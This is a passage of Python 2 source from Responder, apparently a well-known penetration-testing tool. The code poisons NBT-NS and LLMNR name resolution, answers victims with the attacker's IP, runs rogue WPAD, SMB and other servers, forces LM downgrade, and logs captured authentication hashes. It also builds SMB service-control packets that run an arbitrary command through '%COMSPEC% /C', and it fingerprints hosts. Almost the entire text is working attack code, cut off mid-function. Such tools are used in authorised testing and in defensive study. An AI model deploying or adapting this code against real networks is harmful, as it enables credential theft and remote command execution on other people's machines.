        ("DisplayNameIDNull",    "\x00\x00\x00\x00"),
        ("AccessMask",           "\xff\x01\x0f\x00"),
        ("ServerType",           "\x10\x01\x00\x00"),
        ("ServiceStartType",     "\x03\x00\x00\x00"),
        ("ServiceErrorCtl",      "\x00\x00\x00\x00"),
        ("BinPathMaxCount",      "\xb6\x00\x00\x00"),
        ("BinPathOffset",        "\x00\x00\x00\x00"),
        ("BinPathActualCount",   "\xb6\x00\x00\x00"),
        ("BinPathName",          "%COMSPEC% /C \""),
        ("BinCMD",               ""),
        ("BintoEnd",             "\""),
        ("BinPathNameNull",      "\x00\x00"),
        ("Nullz",                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

    def calculate(self):

        BinDataLen = str(self.fields["BinPathName"])+str(self.fields["BinCMD"])+str(self.fields["BintoEnd"])

        ## Calculate first
        self.fields["BinPathMaxCount"] = struct.pack("<i",len(BinDataLen)+1)
        self.fields["BinPathActualCount"] = struct.pack("<i",len(BinDataLen)+1)
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["MaxCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
        self.fields["ActualCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
        ## Then convert to UTF-16LE, yeah it's weird..
        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')
        self.fields["DisplayNameID"] = self.fields["DisplayNameID"].encode('utf-16le')
        self.fields["BinPathName"] = self.fields["BinPathName"].encode('utf-16le')
        self.fields["BinCMD"] = self.fields["BinCMD"].encode('utf-16le')
        self.fields["BintoEnd"] = self.fields["BintoEnd"].encode('utf-16le')



class SMBDCESVCCTLOpenService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x0c\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0c\x00\x00\x00"),
        ("ServiceName",          ""),
        ("MachineNameNull",      "\x00\x00"),
        ("AccessMask",           "\xff\x01\x0f\x00"),
    ])

    def calculate(self):
        ## Calculate first
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        ## Then convert to UTF-16LE, yeah it's weird..
        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')

class SMBDCESVCCTLStartService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

def ParseAnswerKey(data,host):
    key = data[73:81]
    print "Key retrieved is:%s from host:%s"%(key.encode("hex"),host)
    return key

##################################################################################
#SMB Server Stuff
##################################################################################

#Calculate total SMB packet len.
def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

#Set MID SMB Header field.
def midcalc(data):
    pack=data[34:36]
    return pack

#Set UID SMB Header field.
def uidcalc(data):
    pack=data[32:34]
    return pack

#Set PID SMB Header field.
def pidcalc(data):
    pack=data[30:32]
    return pack

#Set TID SMB Header field.
def tidcalc(data):
    pack=data[28:30]
    return pack

#SMB Header answer packet.
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("errorcode", "\x00\x00\x00\x00" ),
        ("flag1", "\x80"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\xff\xfe"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

#SMB Negotiate Answer packet.
class SMBNegoAns(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("Maxbuffsize",  "\x04\x11\x00\x00"),
        ("Maxrawbuff",   "\x00\x00\x01\x00"),
        ("Sessionkey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfd\x43\x00\x00"),
        ("Systemtime",   "\xc2\x74\xf2\x53\x70\x02\xcf\x01\x2c\x01"),
        ("Keylength",    "\x08"),
        ("Bcc",          "\x10\x00"),
        ("Key",          "\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d"),
        ("Domain",       ""),

    ])

    def calculate(self):

        ##Then calculate.
        CompleteBCCLen =  str(self.fields["Key"])+str(self.fields["Domain"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        self.fields["Keylength"] = struct.pack("<h",len(self.fields["Key"]))[0]

# SMB Session/Tree Answer.
class SMBSessTreeAns(Packet):
    fields = OrderedDict([
        ("Wordcount",       "\x03"),
        ("Command",         "\x75"), 
        ("Reserved",        "\x00"),
        ("AndXoffset",      "\x4e\x00"),
        ("Action",          "\x01\x00"),
        ("Bcc",             "\x25\x00"),
        ("NativeOs",        "Windows 5.1"),
        ("NativeOsNull",    "\x00"),
        ("NativeLan",       "Windows 2000 LAN Manager"),
        ("NativeLanNull",   "\x00"),
        ("WordcountTree",   "\x03"),
        ("AndXCommand",     "\xff"),
        ("Reserved1",       "\x00"),
        ("AndxOffset",      "\x00\x00"),
        ("OptionalSupport", "\x01\x00"),
        ("Bcc2",            "\x08\x00"),
        ("Service",         "A:"),
        ("ServiceNull",     "\x00"),
        ("FileSystem",      "NTFS"),
        ("FileSystemNull",  "\x00"),

    ])

    def calculate(self):
        ##AndxOffset
        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["Command"])+str(self.fields["Reserved"])+str(self.fields["AndXoffset"])+str(self.fields["Action"])+str(self.fields["Bcc"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])

        self.fields["AndXoffset"] = struct.pack("<i", len(CalculateCompletePacket)+32)[:2]#SMB Header is *always* 32.
        ##BCC 1 and 2
        CompleteBCCLen =  str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        CompleteBCC2Len = str(self.fields["Service"])+str(self.fields["ServiceNull"])+str(self.fields["FileSystem"])+str(self.fields["FileSystemNull"])
        self.fields["Bcc2"] = struct.pack("<h",len(CompleteBCC2Len))

class SMBSessEmpty(Packet):
    fields = OrderedDict([
        ("Empty",       "\x00\x00\x00"),
    ])


########NEW FILE########
__FILENAME__ = Responder
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os,ConfigParser,BaseHTTPServer, select,urlparse,zlib, string, time
from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler,BaseServer
from Fingerprint import RunSmbFinger,OsNameClientVersion
from odict import OrderedDict
from socket import inet_aton
from random import randrange

parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -w -r -f\nor:\npython %prog -i 10.20.30.40 -wrf',
                               prog=sys.argv[0],
                               )
parser.add_option('-A','--analyze', action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning anything.", dest="Analyse")

parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-I','--interface', action="store", help="Network interface to use", metavar="eth0", dest="INTERFACE", default="Not set")

parser.add_option('-b', '--basic',action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned.", dest="Basic", default=False)

parser.add_option('-r', '--wredir',action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False", dest="Wredirect", default=False)

parser.add_option('-d', '--NBTNSdomain',action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False",dest="NBTNSDomain", default=False)

parser.add_option('-f','--fingerprint', action="store_true", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", default=False)

parser.add_option('-w','--wpad', action="store_true", dest="WPAD_On_Off", help = "Set this to start the WPAD rogue proxy server. Default value is False", default=False)

parser.add_option('-F','--ForceWpadAuth', action="store_true", dest="Force_WPAD_Auth", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False",default=False)

parser.add_option('--lm',action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False", dest="LM_On_Off", default=False)

parser.add_option('-v',action="store_true", help="More verbose",dest="Verbose")

options, args = parser.parse_args()

if options.OURIP is None:
   print "\n\033[1m\033[31m-i mandatory option is missing\033[0m\n"
   parser.print_help()
   exit(-1)

ResponderPATH = os.path.dirname(__file__)

#Config parsing
config = ConfigParser.ConfigParser()
config.read(os.path.join(ResponderPATH,'Responder.conf'))

# Set some vars.
On_Off = config.get('Responder Core', 'HTTP').upper()
SSL_On_Off = config.get('Responder Core', 'HTTPS').upper()
SMB_On_Off = config.get('Responder Core', 'SMB').upper()
SQL_On_Off = config.get('Responder Core', 'SQL').upper()
FTP_On_Off = config.get('Responder Core', 'FTP').upper()
POP_On_Off = config.get('Responder Core', 'POP').upper()
IMAP_On_Off = config.get('Responder Core', 'IMAP').upper()
SMTP_On_Off = config.get('Responder Core', 'SMTP').upper()
LDAP_On_Off = config.get('Responder Core', 'LDAP').upper()
DNS_On_Off = config.get('Responder Core', 'DNS').upper()
Krb_On_Off = config.get('Responder Core', 'Kerberos').upper()
NumChal = config.get('Responder Core', 'Challenge')
SessionLog = config.get('Responder Core', 'SessionLog')
Exe_On_Off = config.get('HTTP Server', 'Serve-Exe').upper()
Exec_Mode_On_Off = config.get('HTTP Server', 'Serve-Always').upper()
FILENAME = config.get('HTTP Server', 'Filename')
WPAD_Script = config.get('HTTP Server', 'WPADScript')
RespondTo = config.get('Responder Core', 'RespondTo').strip()
RespondTo.split(",")
RespondToName = config.get('Responder Core', 'RespondToName').strip()
RespondToName.split(",")
#Cli options.
OURIP = options.OURIP
LM_On_Off = options.LM_On_Off
WPAD_On_Off = options.WPAD_On_Off
Wredirect = options.Wredirect
NBTNSDomain = options.NBTNSDomain
Basic = options.Basic
Finger_On_Off = options.Finger
INTERFACE = options.INTERFACE
Verbose = options.Verbose
Force_WPAD_Auth = options.Force_WPAD_Auth
AnalyzeMode = options.Analyse

if INTERFACE != "Not set":
   BIND_TO_Interface = INTERFACE

if INTERFACE == "Not set":
   BIND_TO_Interface = "ALL" 

if len(NumChal) is not 16:
   print "The challenge must be exactly 16 chars long.\nExample: -c 1122334455667788\n"
   parser.print_help()
   exit(-1)

def IsOsX():
   Os_version = sys.platform
   if Os_version == "darwin":
      return True
   else:
      return False

def OsInterfaceIsSupported(INTERFACE):
    if INTERFACE != "Not set":
       if IsOsX():
          return False
       else:
          return True
    if INTERFACE == "Not set":
       return False

def Analyze(AnalyzeMode):
    if AnalyzeMode == True:
       return True
    else:
       return False

#Logger
import logging
logging.basicConfig(filename=str(os.path.join(ResponderPATH,SessionLog)),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
logging.warning('Responder Started')

Log2Filename = str(os.path.join(ResponderPATH,"LLMNR-NBT-NS.log"))
logger2 = logging.getLogger('LLMNR/NBT-NS')
logger2.addHandler(logging.FileHandler(Log2Filename,'w'))

AnalyzeFilename = str(os.path.join(ResponderPATH,"Analyze-LLMNR-NBT-NS.log"))
logger3 = logging.getLogger('Analyze LLMNR/NBT-NS')
logger3.addHandler(logging.FileHandler(AnalyzeFilename,'a'))

def Show_Help(ExtraHelpData):
   help = "NBT Name Service/LLMNR Responder 2.0.\nPlease send bugs/comments to: lgaffie@trustwave.com\nTo kill this script hit CRTL-C\n\n"
   help+= ExtraHelpData
   print help

#Function used to write captured hashs to a file.
def WriteData(outfile,data, user):
    if os.path.isfile(outfile) == False:
       with open(outfile,"w") as outf:
          outf.write(data)
          outf.write("\n")
          outf.close()
    if os.path.isfile(outfile) == True:
       with open(outfile,"r") as filestr:
          if re.search(user.encode('hex'), filestr.read().encode('hex')):
             filestr.close()
             return False
          if re.search(re.escape("$"), user):
             filestr.close()
             return False
          else:
             with open(outfile,"a") as outf2:
                outf2.write(data)
                outf2.write("\n")
                outf2.close()

def PrintData(outfile,user):
    if Verbose == True:
       return True
    if os.path.isfile(outfile) == True:
       with open(outfile,"r") as filestr:
          if re.search(user.encode('hex'), filestr.read().encode('hex')):
             filestr.close()
             return False
          if re.search(re.escape("$"), user):
             filestr.close()
             return False
          else:
             return True
    else:
       return True

def PrintLLMNRNBTNS(outfile,Message):
    if Verbose == True:
       return True
    if os.path.isfile(outfile) == True:
       with open(outfile,"r") as filestr:
          if re.search(re.escape(Message), filestr.read()):
             filestr.close()
             return False
          else:
             return True
    else:
       return True


# Break out challenge for the hexidecimally challenged.  Also, avoid 2 different challenges by accident.
Challenge = ""
for i in range(0,len(NumChal),2):
    Challenge += NumChal[i:i+2].decode("hex")

Show_Help("[+]NBT-NS, LLMNR & MDNS responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface: %s\nChallenge set: %s\nWPAD Proxy Server: %s\nWPAD script loaded:  %s\nHTTP Server: %s\nHTTPS Server: %s\nSMB Server: %s\nSMB LM support: %s\nKerberos Server: %s\nSQL Server: %s\nFTP Server: %s\nIMAP Server: %s\nPOP3 Server: %s\nSMTP Server: %s\nDNS Server: %s\nLDAP Server: %s\nFingerPrint hosts: %s\nServing Executable via HTTP&WPAD: %s\nAlways Serving a Specific File via HTTP&WPAD: %s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,Krb_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))

if AnalyzeMode:
   print '[+]Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n'

#Packet class handling all packet generation (see odict.py).
class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#Function name self-explanatory
def Is_Finger_On(Finger_On_Off):
    if Finger_On_Off == True:
       return True
    if Finger_On_Off == False:
       return False

def RespondToSpecificHost(RespondTo):
    if len(RespondTo)>=1 and RespondTo != ['']:
       return True
    else:
       return False

def RespondToSpecificName(RespondToName):
    if len(RespondToName)>=1 and RespondToName != ['']:
       return True
    else:
       return False

def RespondToIPScope(RespondTo, ClientIp):
    if ClientIp in RespondTo:
       return True
    else:
       return False

def RespondToNameScope(RespondToName, Name):
    if Name in RespondToName:
       return True
    else:
       return False


##################################################################################
#NBT NS Stuff
##################################################################################

#NBT-NS answer packet.
class NBT_Ans(Packet):
    fields = OrderedDict([
        ("Tid",           ""),
        ("Flags",         "\x85\x00"),
        ("Question",      "\x00\x00"),
        ("AnswerRRS",     "\x00\x01"),
        ("AuthorityRRS",  "\x00\x00"),
        ("AdditionalRRS", "\x00\x00"),
        ("NbtName",       ""),
        ("Type",          "\x00\x20"),
        ("Classy",        "\x00\x01"),
        ("TTL",           "\x00\x00\x00\xa5"),  
        ("Len",           "\x00\x06"),  
        ("Flags1",        "\x00\x00"),  
        ("IP",            "\x00\x00\x00\x00"),                      
    ])

    def calculate(self,data):
        self.fields["Tid"] = data[0:2]
        self.fields["NbtName"] = data[12:46]
        self.fields["IP"] = inet_aton(OURIP)

def NBT_NS_Role(data):
    Role = {
        "\x41\x41\x00":"Workstation/Redirector Service.",
        "\x42\x4c\x00":"Domain Master Browser. This name is likely a domain controller or a homegroup.)",
        "\x42\x4d\x00":"Domain controller service. This name is a domain controller.",
        "\x42\x4e\x00":"Local Master Browser.",
        "\x42\x4f\x00":"Browser Election Service.",
        "\x43\x41\x00":"File Server Service.",
        "\x41\x42\x00":"Browser Service.",
    }

    if data in Role:
        return Role[data]
    else:
        return "Service not known."

# Define what are we answering to.
def Validate_NBT_NS(data,Wredirect):
    if Analyze(AnalyzeMode):
       return False

    if NBT_NS_Role(data[43:46]) == "File Server Service.":
       return True

    if NBTNSDomain == True:
       if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
          return True

    if Wredirect == True:
       if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service.":
          return True

    else:
       return False

def Decode_Name(nbname):
    #From http://code.google.com/p/dpkt/ with author's permission.
    try:
       if len(nbname) != 32:
          return nbname
       l = []
       for i in range(0, 32, 2):
          l.append(chr(((ord(nbname[i]) - 0x41) << 4) |
                     ((ord(nbname[i+1]) - 0x41) & 0xf)))
       return filter(lambda x: x in string.printable, ''.join(l).split('\x00', 1)[0].replace(' ', ''))
    except:
       return "Illegal NetBIOS name"

# NBT_NS Server class.
class NB(BaseRequestHandler):

    def handle(self):
        data, socket = self.request
        Name = Decode_Name(data[13:45])

        if Analyze(AnalyzeMode):
           if data[2:4] == "\x01\x10":
              if Is_Finger_On(Finger_On_Off):
                 try:
                    Finger = RunSmbFinger((self.client_address[0],445))
                    Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1])
                    logger3.warning(Message)
                 except Exception:
                    Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s\n"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
                    logger3.warning(Message)
                 if PrintLLMNRNBTNS(AnalyzeFilename,Message):
                    print Message
              else:
                 Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
                 if PrintLLMNRNBTNS(AnalyzeFilename,Message):
                    print Message
                 logger3.warning(Message)

        if RespondToSpecificHost(RespondTo) and Analyze(AnalyzeMode) == False:
           if RespondToIPScope(RespondTo, self.client_address[0]):
              if data[2:4] == "\x01\x10":
                 if Validate_NBT_NS(data,Wredirect):
                    if RespondToSpecificName(RespondToName) == False:
                       buff = NBT_Ans()
                       buff.calculate(data)
                       for x in range(1):
                          socket.sendto(str(buff), self.client_address)
                          Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                          logging.warning(Message)
                          if PrintLLMNRNBTNS(Log2Filename,Message):
                             print Message
                             logger2.warning(Message)
                          if Is_Finger_On(Finger_On_Off):
                             try:
                                Finger = RunSmbFinger((self.client_address[0],445))
                                print '[+] OsVersion is:%s'%(Finger[0])
                                print '[+] ClientVersion is :%s'%(Finger[1])
                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                             except Exception:
                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                pass
                    if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                       buff = NBT_Ans()
                       buff.calculate(data)
                       for x in range(1):
                          socket.sendto(str(buff), self.client_address)
                          Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                          logging.warning(Message)
                          if PrintLLMNRNBTNS(Log2Filename,Message):
                             print Message
                             logger2.warning(Message)
                          if Is_Finger_On(Finger_On_Off):
                             try:
                                Finger = RunSmbFinger((self.client_address[0],445))
                                print '[+] OsVersion is:%s'%(Finger[0])
                                print '[+] ClientVersion is :%s'%(Finger[1])
                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                             except Exception:
                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                pass
                    else:
                       pass
           else:
              pass

        else:
           if data[2:4] == "\x01\x10":
              if Validate_NBT_NS(data,Wredirect) and Analyze(AnalyzeMode) == False:
                 if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                    buff = NBT_Ans()
                    buff.calculate(data)
                    for x in range(1):
                       socket.sendto(str(buff), self.client_address)
                    Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                    logging.warning(Message)
                    if PrintLLMNRNBTNS(Log2Filename,Message):
                       print Message
                       logger2.warning(Message)
                    if Is_Finger_On(Finger_On_Off):
                       try:
                          Finger = RunSmbFinger((self.client_address[0],445))
                          print '[+] OsVersion is:%s'%(Finger[0])
                          print '[+] ClientVersion is :%s'%(Finger[1])
                          logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                          logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                       except Exception:
                          logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                          pass
                 if RespondToSpecificName(RespondToName) == False:
                    buff = NBT_Ans()
                    buff.calculate(data)
                    for x in range(1):
                       socket.sendto(str(buff), self.client_address)
                    Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                    logging.warning(Message)
                    if PrintLLMNRNBTNS(Log2Filename,Message):
                       print Message
                       logger2.warning(Message)
                    if Is_Finger_On(Finger_On_Off):
                       try:
                          Finger = RunSmbFinger((self.client_address[0],445))
                          print '[+] OsVersion is:%s'%(Finger[0])
                          print '[+] ClientVersion is :%s'%(Finger[1])
                          logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                          logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                       except Exception:
                          logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                          pass
                 else:
                    pass

##################################################################################
#Browser Listener and Lanman Finger
##################################################################################
from RAPLANMANPackets import *

def WorkstationFingerPrint(data):
    Role = {
        "\x04\x00"    :"Windows 95",
        "\x04\x10"    :"Windows 98",
        "\x04\x90"    :"Windows ME",
        "\x05\x00"    :"Windows 2000",
        "\x05\x00"    :"Windows XP",
        "\x05\x02"    :"Windows 2003",
        "\x06\x00"    :"Windows Vista/Server 2008",
        "\x06\x01"    :"Windows 7/Server 2008R2",
    }

    if data in Role:
        return Role[data]
    else:
        return False

def PrintServerName(data, entries):
    if entries == 0:
       pass
    else:
       entrieslen = 26*entries
       chunks, chunk_size = len(data[:entrieslen]), entrieslen/entries 
       ServerName = [data[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
       l =[]
       for x in ServerName:
          if WorkstationFingerPrint(x[16:18]):
             l.append(x[:16].replace('\x00', '')+'\n       [-]Os version is:%s'%(WorkstationFingerPrint(x[16:18])))
          else:
             l.append(x[:16].replace('\x00', ''))
       
       return l

def ParsePacket(Payload):
    PayloadOffset = struct.unpack('<H',Payload[51:53])[0]
    StatusCode = Payload[PayloadOffset-4:PayloadOffset-2]
    if StatusCode == "\x00\x00":
       EntriesNum = struct.unpack('<H',Payload[PayloadOffset:PayloadOffset+2])[0]
       ParsedNames = PrintServerName(Payload[PayloadOffset+4:], EntriesNum)
       return ParsedNames
    else:
       return None

def RAPThisDomain(Client,Domain):
    try:
       l =[]
       for x in range(1):
          PDC = RapFinger(Client,Domain,"\x00\x00\x00\x80")
          if PDC is not None:
             l.append('[Analyze mode LANMAN]:')
             l.append('[!]Domain detected on this network:')
             for x in PDC:
                 l.append('   -'+x)
          SQL = RapFinger(Client,Domain,"\x04\x00\x00\x00")
          if SQL is not None:
             l.append('[!]SQL Server detected on Domain %s:'%(Domain))
             for x in SQL:
                 l.append('   -'+x)
          WKST = RapFinger(Client,Domain,"\xff\xff\xff\xff")
          if WKST is not None:
             l.append('[!]Workstations/Servers detected on Domain %s:'%(Domain))
             for x in WKST:
                 l.append('   -'+x)
          else:
             pass
          return '\n'.join(l)
    except:
       pass

def RapFinger(Host,Domain, Type):
    try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((Host,445))  
       s.settimeout(0.3) 
       h = SMBHeader(cmd="\x72",mid="\x01\x00")
       n = SMBNegoData()
       n.calculate()
       packet0 = str(h)+str(n)
       buffer0 = longueur(packet0)+packet0
       s.send(buffer0)
       data = s.recv(1024) 
       ##Session Setup AndX Request, Anonymous.
       if data[8:10] == "\x72\x00":
          head = SMBHeader(cmd="\x73",mid="\x02\x00")
          t = SMBSessionData()
          t.calculate()
          final = t 
          packet1 = str(head)+str(t)
          buffer1 = longueur(packet1)+packet1  
          s.send(buffer1)
          data = s.recv(1024) 
          ##Tree Connect IPC$.
          if data[8:10] == "\x73\x00":
             head = SMBHeader(cmd="\x75",flag1="\x08", flag2="\x01\x00",uid=data[32:34],mid="\x03\x00")
             t = SMBTreeConnectData(Path="\\\\"+Host+"\\IPC$")
             t.calculate()
             packet1 = str(head)+str(t)
             buffer1 = longueur(packet1)+packet1  
             s.send(buffer1)
             data = s.recv(1024)
             ##Rap ServerEnum.
             if data[8:10] == "\x75\x00":
                head = SMBHeader(cmd="\x25",flag1="\x08", flag2="\x01\xc8",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x04\x00")
                t = SMBTransRAPData(Data=RAPNetServerEnum3Data(ServerType=Type,DetailLevel="\x01\x00",TargetDomain=Domain))
                t.calculate() 
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1  
                s.send(buffer1)
                data = s.recv(64736)
                ##Rap ServerEnum, Get answer and return what we're looking for.
                if data[8:10] == "\x25\x00":
                   s.close()
                   return ParsePacket(data)
    except:
       return None

def BecomeBackup(data,Client):
    try:
       DataOffset = struct.unpack('<H',data[139:141])[0]
       BrowserPacket = data[82+DataOffset:]
       if BrowserPacket[0] == "\x0b":
          ServerName = BrowserPacket[1:]
          Domain = Decode_Name(data[49:81])
          Name = Decode_Name(data[15:47])
          Role = NBT_NS_Role(data[45:48])
          Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a Local Master Browser Backup on this domain: %s."%(Client, Name,Role,Domain)
          if PrintLLMNRNBTNS(AnalyzeFilename,Message):
             print Message
          if AnalyzeMode:
             Message1=RAPThisDomain(Client,Domain)
             if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
                print Message1
                logger3.warning(Message1)
          logger3.warning(Message)
    except:
       pass

def ParseDatagramNBTNames(data,Client):
    try:
       Domain = Decode_Name(data[49:81])
       Name = Decode_Name(data[15:47])
       Role1 = NBT_NS_Role(data[45:48])
       Role2 = NBT_NS_Role(data[79:82])
       Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s'%(Client, Name, Role1, Domain, Role2)
       if Role2 == "Domain controller service. This name is a domain controller." or Role2 == "Browser Election Service." or Role2 == "Local Master Browser.":
          if PrintLLMNRNBTNS(AnalyzeFilename,Message):
             print Message
          if AnalyzeMode:
             Message1=RAPThisDomain(Client,Domain)
             if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
                print Message1
                logger3.warning(Message1)
          logger3.warning(Message)
    except:
       pass

class Browser(BaseRequestHandler):

    def handle(self):
        try:
           request, socket = self.request
           if Analyze(AnalyzeMode):
              ParseDatagramNBTNames(request,self.client_address[0])
              BecomeBackup(request,self.client_address[0])
           BecomeBackup(request,self.client_address[0])
        except Exception:
           pass
##################################################################################
#SMB Server
##################################################################################
from SMBPackets import *

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
    SecBlobLen = struct.unpack('<H',data[51:53])[0]
    if SecBlobLen < 220:
       SSPIStart = data[75:]
       LMhashLen = struct.unpack('<H',data[89:91])[0]
       if LMhashLen == 0 or LMhashLen == 1:
          return True
       else:
          return False
    if SecBlobLen > 220:
       SSPIStart = data[79:]
       LMhashLen = struct.unpack('<H',data[93:95])[0]
       if LMhashLen == 0 or LMhashLen == 1:
          return True
       else:
          return False

def Is_LMNT_Anonymous(data):
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    if LMhashLen == 0 or LMhashLen == 1:
       return True
    else:
       return False

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
    DialectStart = data[40:]
    pack = tuple(DialectStart.split('\x02'))[:10]
    var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
    test = tuple(var)
    if test[0] == "NT LM 0.12":
       return "\x00\x00"
    if test[1] == "NT LM 0.12":
       return "\x01\x00"
    if test[2] == "NT LM 0.12":
       return "\x02\x00"
    if test[3] == "NT LM 0.12":
       return "\x03\x00"
    if test[4] == "NT LM 0.12":
       return "\x04\x00"
    if test[5] == "NT LM 0.12":
       return "\x05\x00"
    if test[6] == "NT LM 0.12":
       return "\x06\x00"
